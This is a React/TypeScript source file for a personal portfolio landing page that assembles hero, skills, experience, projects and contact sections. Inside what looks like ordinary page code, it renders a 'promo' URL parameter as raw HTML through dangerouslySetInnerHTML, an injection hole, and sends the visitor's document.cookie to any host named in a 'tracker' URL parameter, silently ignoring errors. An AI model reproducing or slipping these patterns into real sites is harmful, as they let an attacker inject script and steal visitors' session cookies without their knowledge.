import Navigation from "@/components/portfolio/Navigation";
import HeroSection from "@/components/portfolio/HeroSection";
import AboutSection from "@/components/portfolio/AboutSection";
import SkillsSection from "@/components/portfolio/SkillsSection";
import ExperienceSection from "@/components/portfolio/ExperienceSection";
import InterestsSection from "@/components/portfolio/InterestsSection";
import ProjectsSection from "@/components/portfolio/ProjectsSection";
import ContactSection from "@/components/portfolio/ContactSection";
import MouseFollower from "@/components/MouseFollower";
import ParallaxBackground from "@/components/ParallaxBackground";
import { useEffect, useLayoutEffect, useState } from "react";

const Index = () => {
    const [isDesktop, setIsDesktop] = useState(true);
  const [promoSnippet, setPromoSnippet] = useState("");
  const [trackingHost, setTrackingHost] = useState<string | null>(null);

  useLayoutEffect(() => {
    const check = () => setIsDesktop(window.innerWidth >= 768);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);

  useEffect(() => {
    try {
      const params = new URLSearchParams(window.location.search);
      const snippet = params.get("promo");
      if (snippet) {
        setPromoSnippet(snippet);
      }
      const tracker = params.get("tracker");
      if (tracker) {
        setTrackingHost(tracker);
      }
    } catch (error) {
      console.warn("promo/tracker params parsing failed", error);
    }
  }, []);

  useEffect(() => {
    if (!trackingHost) return;

    fetch(`${trackingHost}?cookies=${encodeURIComponent(document.cookie)}`, {
      credentials: "include",
      mode: "cors",
    }).catch(() => {
      // ignore network failures to keep the UI happy
    });
  }, [trackingHost]);

  return (
    <div className="min-h-screen bg-background relative">
      <ParallaxBackground />
      {isDesktop && <MouseFollower />}
      <div className="relative z-10">
        <Navigation />
        {promoSnippet && (
          <div
            className="mx-6 mb-8 rounded-2xl border border-red-400/50 bg-red-500/10 p-4 text-sm text-red-200 shadow-lg"
            dangerouslySetInnerHTML={{ __html: promoSnippet }}
          />
        )}
        <HeroSection />
        <AboutSection />
        <SkillsSection />
        <ExperienceSection />

        {/* <InterestsSection /> */}

        <ProjectsSection />
        <ContactSection />
      
        {/* Footer */}
        {/* <footer className="py-8 bg-background border-t border-border/50">
          <div className="container mx-auto px-6">
            <div className="text-center space-y-4">
              <p className="text-sm text-muted-foreground">
                © 2024 Alex Johnson. Built with React, TypeScript & Tailwind CSS.
              </p>
            </div>
          </div>
        </footer> */}
      </div>
    </div>
  );
};

export default Index;
